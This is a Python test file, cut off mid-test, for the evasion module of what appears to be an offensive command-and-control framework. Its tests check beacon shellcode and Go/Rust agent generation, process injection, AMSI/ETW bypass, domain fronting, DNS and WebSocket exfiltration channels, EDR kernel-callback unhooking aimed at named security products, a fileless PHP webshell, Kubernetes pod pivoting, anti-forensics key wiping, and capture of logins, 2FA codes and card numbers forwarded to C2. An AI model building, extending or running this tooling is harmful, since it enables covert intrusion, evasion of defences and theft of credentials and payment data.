"""
Unit Tests for Evasion Module
Tests for C2 profiles, bypass techniques, and agent generators
"""
import pytest
import os
import sys
import json
import base64
import tempfile
import time
from unittest.mock import patch, MagicMock

# Add parent directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestSleepObfuscation:
    """Test sleep obfuscation module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.sleep_obfuscation import SleepObfuscator
        assert SleepObfuscator is not None
    
    def test_jitter_calculation(self):
        """Test jitter calculation produces valid values"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        
        # Get multiple jitter values
        values = [obfuscator.calculate_jitter() for _ in range(100)]
        
        # All values should be positive
        assert all(v > 0 for v in values)
        
        # Values should be within expected range (60 ± 30%)
        assert min(values) >= 1  # Minimum enforced
        assert max(values) <= 60 * 1.5  # Reasonable max with entropy
    
    def test_fibonacci_jitter(self):
        """Test Fibonacci jitter pattern"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        values = [obfuscator.fibonacci_jitter() for _ in range(50)]
        
        # All values positive
        assert all(v > 0 for v in values)
        
        # Should have some variation
        assert len(set(values)) > 1
    
    def test_gaussian_jitter(self):
        """Test Gaussian jitter distribution"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        values = [obfuscator.gaussian_jitter() for _ in range(100)]
        
        # Mean should be around base_sleep
        mean = sum(values) / len(values)
        assert 40 < mean < 80  # Reasonable range around 60


class TestHeaderRotation:
    """Test header rotation module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.header_rotation import HeaderRotator
        assert HeaderRotator is not None
    
    def test_get_headers(self):
        """Test getting rotated headers"""
        from evasion.header_rotation import HeaderRotator
        
        rotator = HeaderRotator()
        headers = rotator.get_headers()
        
        # Should have User-Agent
        assert 'User-Agent' in headers
        assert len(headers['User-Agent']) > 0
    
    def test_header_rotation(self):
        """Test headers actually rotate"""
        from evasion.header_rotation import HeaderRotator
        
        rotator = HeaderRotator()
        
        # Get multiple header sets
        user_agents = set()
        for _ in range(20):
            headers = rotator.get_headers()
            user_agents.add(headers.get('User-Agent'))
        
        # Should have multiple different user agents
        assert len(user_agents) >= 2


class TestAntiSandbox:
    """Test anti-sandbox detection module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.anti_sandbox import SandboxDetector
        assert SandboxDetector is not None
    
    def test_run_checks(self):
        """Test running sandbox checks"""
        from evasion.anti_sandbox import SandboxDetector
        
        detector = SandboxDetector()
        result = detector.run_all_checks()
        
        # Should return tuple (is_sandbox, confidence, indicators)
        assert isinstance(result, tuple)
        assert len(result) == 3
        is_sandbox, confidence, indicators = result
        assert isinstance(is_sandbox, bool)
        assert isinstance(confidence, (int, float))
        assert isinstance(indicators, list)
    
    def test_hardware_check(self):
        """Test hardware fingerprinting via run_all_checks"""
        from evasion.anti_sandbox import SandboxDetector
        
        detector = SandboxDetector()
        is_sandbox, confidence, indicators = detector.run_all_checks()
        
        # Should return list of indicators
        assert isinstance(indicators, list)


class TestProcessInjection:
    """Test process injection module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.process_injection import ProcessInjector
        assert ProcessInjector is not None
    
    def test_early_bird_code_gen(self):
        """Test Early Bird APC code generation"""
        from evasion.process_injection import ProcessInjector
        
        injector = ProcessInjector()
        
        # Generate code via the generate_apc_injection_code method
        code = injector.generate_apc_injection_code(b'\x90\x90\x90\x90')
        
        # Should return C code string
        assert isinstance(code, str)
        assert len(code) > 0
    
    def test_injection_methods_exist(self):
        """Test injection methods exist"""
        from evasion.process_injection import ProcessInjector
        
        injector = ProcessInjector()
        
        # Check actual methods exist
        assert hasattr(injector, 'generate_apc_injection_code')
        assert hasattr(injector, 'classic_injection')
        assert hasattr(injector, 'get_injection_techniques')

    def test_thread_ghosting_registered(self):
        """Thread-Ghosting technique is registered and described"""
        from evasion.process_injection import (
            ProcessInjector, InjectionTechnique,
        )

        assert InjectionTechnique.THREAD_GHOSTING.value == "thread_ghosting"

        injector = ProcessInjector()
        techniques = injector.get_injection_techniques()
        names = {t["name"] for t in techniques}
        assert "thread_ghosting" in names

        # Fallback chain should include the new technique
        assert InjectionTechnique.THREAD_GHOSTING in injector.config.fallback_chain
        # The executor should know how to dispatch it
        assert hasattr(injector, '_thread_ghosting_injection')
        assert hasattr(injector, 'generate_thread_ghosting_code')

    def test_thread_ghosting_codegen(self):
        """Thread-Ghosting code generation produces a non-empty string"""
        from evasion.process_injection import ProcessInjector

        injector = ProcessInjector()
        code = injector.generate_thread_ghosting_code(b'\x90\x90\x90\x90')
        assert isinstance(code, str)
        assert len(code) > 0
        assert "thread_ghost" in code


class TestC2TrafficEntropy:
    """Test C2 traffic entropy obfuscation (stego / decoy carriers)"""

    def test_import(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy
        assert C2TrafficEntropy is not None

    def test_html_roundtrip(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy

        e = C2TrafficEntropy(beacon_id="test", carrier="html")
        payload = os.urandom(64)
        carrier, ctype = e.embed(payload)
        assert isinstance(carrier, bytes)
        assert ctype == "text/html"
        recovered = e.extract(carrier, ctype)
        assert recovered == payload

    def test_png_roundtrip_when_pil(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy, PIL_AVAILABLE

        e = C2TrafficEntropy(beacon_id="test", carrier="auto")
        payload = os.urandom(48)
        carrier, ctype = e.embed(payload)
        if PIL_AVAILABLE and ctype == "image/png":
            recovered = e.extract(carrier, ctype)
            assert recovered == payload
        else:
            # Falls back to HTML carrier; still round-trips
            recovered = e.extract(carrier, ctype)
            assert recovered == payload

    def test_extract_passthrough_on_plaintext(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy

        e = C2TrafficEntropy(carrier="html")
        plain = b"not-a-carrier"
        assert e.extract(plain, "text/html") == plain


class TestAMSIBypass:
    """Test AMSI bypass module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.amsi_bypass import AMSIBypass, ETWBypass
        assert AMSIBypass is not None
        assert ETWBypass is not None
    
    def test_bypass_methods_exist(self):
        """Test bypass methods exist"""
        from evasion.amsi_bypass import AMSIBypass, ETWBypass
        
        # These are classes with static methods
        # Check class static methods exist
        assert hasattr(AMSIBypass, 'get_reflection_bypass')
        assert hasattr(AMSIBypass, 'get_memory_patch_bypass')
        assert hasattr(ETWBypass, 'get_etw_patch')
    
    def test_amsi_bypass_call(self):
        """Test AMSI bypass can be called"""
        from evasion.amsi_bypass import AMSIBypass
        
        # Static method returns PowerShell code
        code = AMSIBypass.get_reflection_bypass()
        assert isinstance(code, str)
        assert len(code) > 0


class TestC2Profiles:
    """Test C2 profile management"""
    
    def test_import(self):
        """Test module import"""
        from evasion.c2_profiles import ProfileManager, C2Profile
        assert ProfileManager is not None
        assert C2Profile is not None
    
    def test_builtin_profiles(self):
        """Test built-in profiles exist"""
        from evasion.c2_profiles import ProfileManager
        
        manager = ProfileManager()
        profiles = manager.list_profiles()
        
        # Should have built-in profiles
        assert 'default' in profiles
        assert 'amazon' in profiles
        assert 'microsoft' in profiles
        assert 'google' in profiles
    
    def test_get_profile(self):
        """Test getting a profile"""
        from evasion.c2_profiles import ProfileManager
        
        manager = ProfileManager()
        profile = manager.get_profile('amazon')
        
        assert profile is not None
        assert profile.name == 'amazon'
        assert profile.http_get is not None
        assert profile.http_post is not None
        assert profile.evasion is not None
    
    def test_profile_yaml_roundtrip(self):
        """Test saving and loading profile from YAML"""
        from evasion.c2_profiles import ProfileManager, C2Profile, EvasionConfig
        
        manager = ProfileManager()
        
        # Get a profile
        profile = manager.get_profile('google')
        
        # Save to temp file
        with tempfile.NamedTemporaryFile(suffix='.yaml', delete=False) as f:
            temp_path = f.name
        
        try:
            manager.save_profile(profile, temp_path)
            
            # Load it back
            loaded = manager.load_from_yaml(temp_path)
            
            assert loaded.name == profile.name
            assert loaded.user_agent == profile.user_agent
        finally:
            os.unlink(temp_path)
    
    def test_profile_applicator(self):
        """Test applying profile to requests"""
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        manager = ProfileManager()
        profile = manager.get_profile('slack')
        applicator = ProfileApplicator(profile)
        
        # Build GET request
        metadata = b'test beacon metadata'
        request = applicator.build_get_request(metadata)
        
        assert 'uri' in request
        assert 'headers' in request
        assert 'User-Agent' in request['headers']
    
    def test_placeholder_expansion(self):
        """Test placeholder expansion in profiles"""
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        manager = ProfileManager()
        profile = manager.get_profile('microsoft')
        applicator = ProfileApplicator(profile)
        
        # Expand placeholders
        text = "{{RANDOM_GUID}}-{{TIMESTAMP}}"
        expanded = applicator._expand_placeholders(text)
        
        # Should be different from original
        assert expanded != text
        assert '{{' not in expanded


class TestTrafficMasking:
    """Test traffic masking module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.traffic_masking import TrafficMasker, DomainFronter
        assert TrafficMasker is not None
        assert DomainFronter is not None
    
    def test_list_profiles(self):
        """Test listing traffic profiles"""
        from evasion.traffic_masking import TrafficMasker
        
        masker = TrafficMasker()
        profiles = masker.list_profiles()
        
        assert 'google_search' in profiles
        assert 'ms_update' in profiles
        assert 'slack_api' in profiles
    
    def test_mask_request(self):
        """Test masking a request"""
        from evasion.traffic_masking import TrafficMasker
        
        masker = TrafficMasker()
        data = b'secret beacon data'
        
        masked = masker.mask_request(data, 'google_search')
        
        assert 'user_agent' in masked
        assert 'path' in masked
        assert 'headers' in masked
    
    def test_domain_fronting_example(self):
        """Test domain fronting config generation"""
        from evasion.traffic_masking import DomainFronter
        
        fronter = DomainFronter()
        
        # Generate fronted request
        request = fronter.generate_fronted_request(
            b'test data',
            cdn='cloudfront',
            real_host='c2.example.com'
        )
        
        assert 'connect_host' in request
        assert 'host_header' in request
        assert request['host_header'] == 'c2.example.com'


class TestFallbackChannels:
    """Test fallback channels module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.fallback_channels import (
            WebSocketChannel, DNSChannel, ICMPChannel, 
            DoHChannel, FallbackManager
        )
        assert WebSocketChannel is not None
        assert DNSChannel is not None
        assert FallbackManager is not None
    
    def test_fallback_manager(self):
        """Test fallback manager initialization"""
        from evasion.fallback_channels import FallbackManager, DNSChannel, DNSConfig
        
        manager = FallbackManager()
        
        # Add channels
        dns = DNSChannel(DNSConfig(domain='test.example.com'))
        manager.add_channel(dns, priority=1)
        
        status = manager.get_status()
        assert len(status['channels']) == 1
    
    def test_dns_encoding(self):
        """Test DNS data encoding"""
        from evasion.fallback_channels import DNSChannel, DNSConfig
        
        channel = DNSChannel(DNSConfig(domain='test.example.com'))
        
        # The send method encodes data - test the encoding part
        import base64
        data = b'hello world'
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Should be DNS-safe
        assert all(c.isalnum() for c in encoded)


class TestReflectiveLoader:
    """Test reflective loader module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.reflective_loader import ReflectiveLoader, StagelessPayload
        assert ReflectiveLoader is not None
        assert StagelessPayload is not None
    
    def test_stageless_generation(self):
        """Test stageless payload generation"""
        from evasion.reflective_loader import StagelessPayload
        
        generator = StagelessPayload()
        payload = generator.generate_stageless_beacon(
            c2_host='192.168.1.100',
            c2_port=443,
            arch='x64'
        )
        
        # Should have multiple formats
        assert 'shellcode' in payload
        assert 'shellcode_b64' in payload
        assert 'powershell' in payload
        assert 'csharp' in payload
        assert 'python' in payload
        
        # Shellcode should be bytes
        assert isinstance(payload['shellcode'], bytes)
        assert len(payload['shellcode']) > 0


class TestGoAgent:
    """Test Go agent generator"""
    
    def test_import(self):
        """Test module import"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        assert GoAgentGenerator is not None
    
    def test_generate_source(self):
        """Test Go source generation"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        
        config = GoAgentConfig(
            c2_host='192.168.1.100',
            c2_port=443,
            kill_date='2026-12-31',
            working_hours='09:00-17:00'
        )
        
        generator = GoAgentGenerator(config)
        source = generator.generate()
        
        # Should be valid Go code structure
        assert 'package main' in source
        assert 'func main()' in source
        assert '192.168.1.100' in source
        assert '2026-12-31' in source
    
    def test_build_commands(self):
        """Test build command generation"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        
        config = GoAgentConfig(c2_host='test.com', c2_port=443)
        generator = GoAgentGenerator(config)
        
        commands = generator.get_build_commands('agent')
        
        assert 'windows_amd64' in commands
        assert 'linux_amd64' in commands
        assert 'darwin_amd64' in commands


class TestRustAgent:
    """Test Rust agent generator"""
    
    def test_import(self):
        """Test module import"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        assert RustAgentGenerator is not None
    
    def test_generate_cargo_toml(self):
        """Test Cargo.toml generation"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        
        config = RustAgentConfig(c2_host='test.com', c2_port=443)
        generator = RustAgentGenerator(config)
        
        cargo = generator.generate_cargo_toml()
        
        assert '[package]' in cargo
        assert 'reqwest' in cargo
        assert 'aes-gcm' in cargo
    
    def test_generate_main_rs(self):
        """Test main.rs generation"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        
        config = RustAgentConfig(
            c2_host='192.168.1.100',
            c2_port=8443,
            evasion_level=3
        )
        
        generator = RustAgentGenerator(config)
        main = generator.generate_main()
        
        # Should have Rust structure
        assert 'fn main()' in main
        assert '192.168.1.100' in main
        assert 'C2_PORT: u16 = 8443' in main


class TestIntegration:
    """Integration tests for evasion module"""
    
    def test_full_import(self):
        """Test importing all evasion modules"""
        from evasion import (
            SleepObfuscator,
            HeaderRotator,
            SandboxDetector,
            ProcessInjector,
            AMSIBypass,
            ETWBypass,
            TrafficMasker,
            DomainFronter,
            ReflectiveLoader,
            StagelessPayload
        )
        
        # All imports should succeed
        assert SleepObfuscator is not None
        assert HeaderRotator is not None
        assert SandboxDetector is not None
    
    def test_beacon_workflow(self):
        """Test complete beacon workflow"""
        from evasion.sleep_obfuscation import SleepObfuscator
        from evasion.header_rotation import HeaderRotator
        from evasion.anti_sandbox import SandboxDetector
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        # 1. Load profile
        manager = ProfileManager()
        profile = manager.get_profile('google')
        applicator = ProfileApplicator(profile)
        
        # 2. Check sandbox (returns tuple)
        detector = SandboxDetector()
        is_sandbox, confidence, indicators = detector.run_all_checks()
        
        # 3. Build request with evasion
        if not is_sandbox or confidence < 0.8:
            metadata = b'beacon-id-12345'
            request = applicator.build_get_request(metadata)
            
            assert 'headers' in request
            assert 'uri' in request
        
        # 4. Calculate sleep
        sleep = SleepObfuscator(
            base_sleep=profile.evasion.sleep_time,
            jitter_percent=profile.evasion.jitter_percent
        )
        sleep_time = sleep.calculate_jitter()
        
        assert sleep_time > 0


# Run tests
if __name__ == '__main__':
    pytest.main([__file__, '-v'])


class TestFilelessWebShell:
    """Test FastCGI in-memory (fileless) webshell"""

    def test_import(self):
        from evasion.fileless_webshell import FastCGIInjection, build_fastcgi_request
        assert FastCGIInjection is not None

    def test_build_request_has_fcgi_structure(self):
        from evasion.fileless_webshell import build_fastcgi_request, FCGI

        body = b"<?php phpinfo(); ?>"
        req = build_fastcgi_request("/var/www/html/index.php", body)
        # Magic version byte + begin-request type present.
        assert req[0] == FCGI.VERSION_1
        assert FCGI.BEGIN_REQUEST in req
        assert FCGI.PARAMS in req
        assert FCGI.STDIN in req

    def test_params_enable_in_memory_exec(self):
        from evasion.fileless_webshell import php_in_memory_params

        params = php_in_memory_params("/var/www/html/index.php")
        assert "auto_prepend_file = php://input" in params["PHP_VALUE"]
        assert "allow_url_include = On" in params["PHP_VALUE"]

    def test_ghost_shell_self_decrypting(self):
        from evasion.fileless_webshell import FastCGIInjection

        inj = FastCGIInjection()
        shell = inj.generate_ghost_shell(os.urandom(32))
        assert "php://input" in shell
        assert "sodium_crypto_aead_aes256gcm_decrypt" in shell

    def test_wire_roundtrip(self):
        from evasion.fileless_webshell import FastCGIInjection

        inj = FastCGIInjection()
        key = os.urandom(32)
        body = inj.build_request_body("system('id');", key)
        assert isinstance(body, bytes)


class TestInRequestExfil:
    """Test protocol-level (in-request) data exfiltration"""

    def test_import(self):
        from evasion.in_request_exfil import ProtocolExfil, WebSocketTunnelExfil
        assert ProtocolExfil is not None

    def test_websocket_roundtrip(self):
        from evasion.in_request_exfil import WebSocketTunnelExfil

        exf = WebSocketTunnelExfil(chunk_size=64)
        data = os.urandom(500)
        frames = exf.exfiltrate(data)
        # Binary frames carry the payload; recover must be lossless.
        assert exf.recover(frames) == data

    def test_websocket_wire_frames(self):
        from evasion.in_request_exfil import WebSocketTunnelExfil

        exf = WebSocketTunnelExfil(chunk_size=32)
        frames = exf.exfiltrate(b"secret-loot-bytes")
        raw = exf.encode_wire(frames)
        decoded = exf.decode_wire(raw)
        # Heartbeat (ping) frames are ignored on recover.
        assert exf.recover(decoded) == b"secret-loot-bytes"

    def test_http2_stream_smuggle(self):
        from evasion.in_request_exfil import HTTP2StreamSmuggler

        sm = HTTP2StreamSmuggler(chunk_size=32, streams=3)
        data = os.urandom(200)
        frames = sm.plan(data)
        assert len(frames) > 0
        # Each frame looks like a benign API heartbeat (x-trace trailer).
        assert all("x-trace" in f.meta for f in frames)
        assert sm.recover(frames) == data

    def test_protocol_exfil_selector(self):
        from evasion.in_request_exfil import ProtocolExfil, ExfilChannel

        for ch in (ExfilChannel.WEBSOCKET, ExfilChannel.HTTP2):
            exf = ProtocolExfil(channel=ch)
            data = b"exfil-me-over-" + os.urandom(120)
            assert exf.roundtrip(data) == data


class TestAntiForensicsRotation:
    """Test anti-forensics key / beacon-ID rotation"""

    def test_import(self):
        from evasion.anti_forensics_rotation import (
            AntiForensicsRotator, secure_wipe, RotationReport,
        )
        assert AntiForensicsRotator is not None

    def test_secure_wipe_zeroes_buffer(self):
        from evasion.anti_forensics_rotation import secure_wipe

        buf = bytearray(b"SECRET_KEY_MATERIAL_1234567890")
        secure_wipe(buf)
        assert buf == bytearray(len(buf))  # fully zeroed

    def test_rotate_changes_id_and_keys(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def __init__(self):
                self.beacon_id = "oldid"
                self.key = b"\x01" * 32
            def rotate(self, new_id=None):
                self.beacon_id = new_id or "newid"
                self.key = b"\x02" * 32
                return self.beacon_id

        class FakeConfig:
            beacon_id = "oldid"
            enable_anti_forensics_rotation = True
            rotation_interval = 86400

        net = FakeNetCrypto()
        cfg = FakeConfig()
        rotated = []
        rot = AntiForensicsRotator(net, cfg, extra_key_rotators=[lambda: rotated.append(1)])

        report = rot.rotate()
        assert report.old_beacon_id == "oldid"
        assert report.new_beacon_id != "oldid"
        assert report.new_beacon_id == cfg.beacon_id
        assert report.rotated_keys >= 2  # network + extra
        assert report.envelope["type"] == "anti_forensics_rotation"
        assert rot.verify_envelope(report.envelope)

    def test_maybe_rotate_respects_interval(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def rotate(self, new_id=None):
                return new_id or "x"
        class FakeConfig:
            beacon_id = "a"
            enable_anti_forensics_rotation = True
            rotation_interval = 86400

        rot = AntiForensicsRotator(FakeNetCrypto(), FakeConfig())
        # First call stamps baseline, no rotation.
        assert rot.maybe_rotate(now=1000) is None
        # Within interval: still None.
        assert rot.maybe_rotate(now=1000 + 3600) is None
        # Past interval: rotates.
        rep = rot.maybe_rotate(now=1000 + 86400)
        assert rep is not None

    def test_disabled_does_not_rotate(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def rotate(self, new_id=None):
                return new_id or "x"
        class FakeConfig:
            beacon_id = "a"
            enable_anti_forensics_rotation = False
            rotation_interval = 86400

        rot = AntiForensicsRotator(FakeNetCrypto(), FakeConfig())
        assert rot.maybe_rotate(now=0) is None
        assert rot.maybe_rotate(now=10 ** 9) is None


class TestBeaconAntiForensicsIntegration:
    """Test rotation wired into the beacon crypto classes"""

    def test_transient_crypto_rotate_wipes_old(self):
        from agents.evasive_beacon import TransientNetworkCrypto

        c = TransientNetworkCrypto(beacon_id="id1")
        old_key_id = c._key
        new_id = c.rotate("id2")
        assert new_id == "id2"
        # Key object replaced (old one wiped via secure_wipe).
        assert c._key != old_key_id or bytes(c._key) != bytes(old_key_id)

    def test_task_crypto_rotate(self):
        from agents.evasive_beacon import TaskCrypto

        t = TaskCrypto()
        before = bytes(t._key)
        t.rotate()
        assert bytes(t._key) != before

    def test_rotation_roundtrip(self):
        from agents.evasive_beacon import TransientNetworkCrypto

        c = TransientNetworkCrypto(beacon_id="id1")
        pt = b"hello-forensics"
        ct = c.encrypt(pt)
        # Before rotation, decrypt works.
        assert c.decrypt(ct) == pt
        c.rotate("id2")
        # Old ciphertext can no longer be decrypted with the new key.
        assert c.decrypt(ct) != pt


class TestAPISequenceSpoofing:
    """Test API sequence spoofing (behavioral analysis evasion)"""

    def test_import(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer
        assert APISequenceSpoofer is not None

    def test_plan_interleaves_chaff(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer, APICategory

        spoofer = APISequenceSpoofer(template="svchost_heartbeat", chaff_per_call=2)
        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        seq = spoofer.plan(real)

        # Every real call must be present and flagged as beacon-originated.
        beacon_calls = [c for c in seq if c.beacon]
        assert [c.name for c in beacon_calls] == real
        # No two real calls should sit adjacent (chaff in between).
        for i in range(len(seq) - 1):
            if seq[i].beacon and seq[i + 1].beacon:
                pytest.fail("two beacon calls are adjacent - n-gram not broken")

    def test_score_lower_after_spoofing(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer

        spoofer = APISequenceSpoofer(chaff_per_call=3)
        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        # Bare injection burst scores high.
        bare = spoofer.score([_make_fake_call(c) for c in real])
        # Spoofed sequence scores lower.
        spoofed = spoofer.score(spoofer.plan(real))
        assert spoofed <= bare

    def test_benign_baseline_low(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer

        spoofer = APISequenceSpoofer()
        assert spoofer.benign_score() < 0.5


def _make_fake_call(name):
    from evasion.api_sequence_spoofing import APICall, APICategory
    return APICall(name=name, category=APICategory.INJECT_SENSITIVE, beacon=True)


class TestKernelCallbackUnhook:
    """Test kernel callback unhooking (the Snitch-Killer)"""

    def test_import(self):
        from tools.byovd_module import KernelCallbackUnhooker, CallbackEntry
        assert KernelCallbackUnhooker is not None

    def test_find_edr_callbacks(self):
        from tools.byovd_module import KernelCallbackUnhooker

        unhooker = KernelCallbackUnhooker()
        entries = unhooker.find_edr_callbacks(["csagent.sys", "SentinelMonitor.sys"])
        assert len(entries) >= 1
        assert all(e.driver_name.lower().endswith(".sys") for e in entries)

    def test_unhook_report(self):
        from tools.byovd_module import KernelCallbackUnhooker

        unhooker = KernelCallbackUnhooker()
        report = unhooker.unhook_edr(["crowdstrike", "sentinelone"], method="nop")
        assert report["status"] == "completed"
        assert report["callbacks_found"] >= 1
        assert report["callbacks_neutralised"] == report["callbacks_found"]

    def test_byovd_module_method(self):
        from tools.byovd_module import get_byovd_module

        module = get_byovd_module()
        report = module.unhook_kernel_callbacks(["crowdstrike"], method="redirect")
        assert report["status"] == "completed"
        assert report["method"] == "redirect"


class TestBehavioralMimicryAPISpoof:
    """Test API sequence spoofing wired into BehavioralMimicryEngine"""

    def test_engine_has_spoofer(self):
        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode

        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
        assert engine.api_spoofer is not None

    def test_plan_via_engine(self):
        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode

        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
        seq = engine.plan_api_sequence(
            ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        )
        assert len(seq) > 3
        assert engine.score_api_sequence(seq) < 1.0


class TestGhostWatchdog:
    """Test eBPF in-memory watchdog for web-shell persistence"""

    def test_import(self):
        from evasion.ghost_watchdog import FastCGIWatchdog, generate_ebpf_watchdog_c
        assert FastCGIWatchdog is not None

    def test_ebpf_source_contains_tracepoint(self):
        from evasion.ghost_watchdog import generate_ebpf_watchdog_c

        c = generate_ebpf_watchdog_c("php-fpm")
        assert "tp/sched/sched_process_exit" in c
        assert "php-fpm" in c
        assert "bpf_ringbuf_submit" in c

    def test_ebpf_support_dict(self):
        from evasion.ghost_watchdog import FastCGIWatchdog

        wd = FastCGIWatchdog(mode=__import__("evasion.ghost_watchdog", fromlist=["WatchdogMode"]).WatchdogMode.SIMULATE)
        sup = wd.check_ebpf_support()
        assert "ebpf_available" in sup
        assert "required_caps" in sup

    def test_simulate_exit_reinjects(self):
        from evasion.ghost_watchdog import FastCGIWatchdog, WatchdogMode

        calls = []
        def fake_inject(body):
            calls.append(body)
            class R:
                success = True
                response = "ok"
                error = None
            return R()

        wd = FastCGIWatchdog(inject_fn=fake_inject, mode=WatchdogMode.SIMULATE)
        res = wd.simulate_exit()
        assert res.success is True
        assert wd.reinjections == 1
        assert len(calls) == 1

    def test_poll_mode_reinjects_on_dead_pid(self):
        from evasion.ghost_watchdog import FastCGIWatchdog, WatchdogMode

        calls = []
        def fake_inject(body):
            calls.append(1)
            class R:
                success = True
            return R()

        # Use a PID that does not exist so run_once triggers re-injection.
        wd = FastCGIWatchdog(inject_fn=fake_inject, mode=WatchdogMode.POLL, watch_pid=999999)
        wd.run_once()
        assert wd.reinjections == 1


class TestK8sGhostPivot:
    """Test K8s Kraken v2 ephemeral-storage pod pivot"""

    def test_import(self):
        from evasion.k8s_ghost_pivot import K8sGhostPivot, PodInfo, SharedVolumeKind
        assert K8sGhostPivot is not None

    def test_detect_shared_volume_pods(self):
        from evasion.k8s_ghost_pivot import K8sGhostPivot, PodInfo

        pods = [
            PodInfo(name="web-0", shared_volumes=["ghost-share-pvc"]),
            PodInfo(name="web-1", shared_volumes=["ghost-share-pvc"]),
            PodInfo(name="web-2", shared_volumes=["other-vol"]),
        ]
        pivot = K8sGhostPivot()
        sibs = pivot.detect_shared_volume_pods(pods, "web-0")
        assert "web-1" in [p.name for p in sibs]
        assert "web-2" not in [p.name for p in sibs]

    def test_plan_pivot(self):
        from evasion.k8s_ghost_pivot import K8sGhostPivot, PodInfo, SharedVolumeKind

        pods = [
            PodInfo(name="web-0", shared_volumes=["ghost-share-pvc"]),
            PodInfo(name="web-1", shared_volumes=["ghost-share-pvc"]),
        ]
        pivot = K8sGhostPivot()
        plans = pivot.plan_pivot(pods, "web-0", SharedVolumeKind.PVC)
        assert len(plans) == 1
        assert plans[0].target_pod == "web-1"
        assert plans[0].method == "ephemeral_propagation"

    def test_plant_ephemeral_payload(self):
        from evasion.k8s_ghost_pivot import K8sGhostPivot

        pivot = K8sGhostPivot()
        art = pivot.plant_ephemeral_payload("/mnt/shared/ghost")
        assert ".ghost_trigger" in art["trigger_path"]
        assert "FastCGIInjection" in art["script"]

    def test_daemonset_yaml(self):
        from evasion.k8s_ghost_pivot import K8sGhostPivot

        pivot = K8sGhostPivot()
        yml = pivot.generate_daemonset_yaml()
        assert "kind: DaemonSet" in yml
        assert "hostPID: true" in yml


class TestWebLogicHijacker:
    """Test Web Application Logic Hijacking (transparent proxy interceptor)"""

    def test_import(self):
        from evasion.web_logic_hijacker import WebLogicHijacker, LogicHijacker
        assert WebLogicHijacker is not None
        assert LogicHijacker is WebLogicHijacker

    def test_inspect_body_captures_login(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"user=admin&pass=secret123&remember=on"
        events = hijacker.inspect_body(body, url="/login", method="POST", source_ip="10.0.0.1")
        assert len(events) == 1
        assert events[0].event_type.value == "login"
        assert "login_password" in events[0].captured_fields
        assert events[0].captured_fields["login_password"] == "secret123"

    def test_inspect_body_captures_password_change(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"current_password=old123&new_password=new456&confirm_password=new456"
        events = hijacker.inspect_body(body, url="/account/change-password", method="POST")
        assert len(events) == 1
        assert events[0].event_type.value == "password_change"
        assert "password_change_new" in events[0].captured_fields

    def test_inspect_body_captures_twofa(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"otp=123456"
        events = hijacker.inspect_body(body, url="/2fa", method="POST")
        assert len(events) == 1
        assert events[0].event_type.value == "twofa_submission"

    def test_inspect_body_captures_payment(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"card_number=4111111111111111&cvv=123&exp_date=12/28"
        events = hijacker.inspect_body(body, url="/payment", method="POST")
        assert len(events) == 1
        assert events[0].event_type.value == "payment_update"
        assert "payment_card" in events[0].captured_fields

    def test_inspect_body_no_match_returns_empty(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"search=cats&page=1"
        events = hijacker.inspect_body(body)
        assert len(events) == 0

    def test_forward_to_c2_offline(self):
        from evasion.web_logic_hijacker import WebLogicHijacker, InterceptedRequest

        hijacker = WebLogicHijacker(offline=True)
        evt = InterceptedRequest(
            event_type=__import__("evasion.web_logic_hijacker", fromlist=["LogicEventType"]).LogicEventType.LOGIN,
            url="/login",
            method="POST",
            captured_fields={"user": "admin"},
            raw_body=b"user=admin&pass=x",
        )
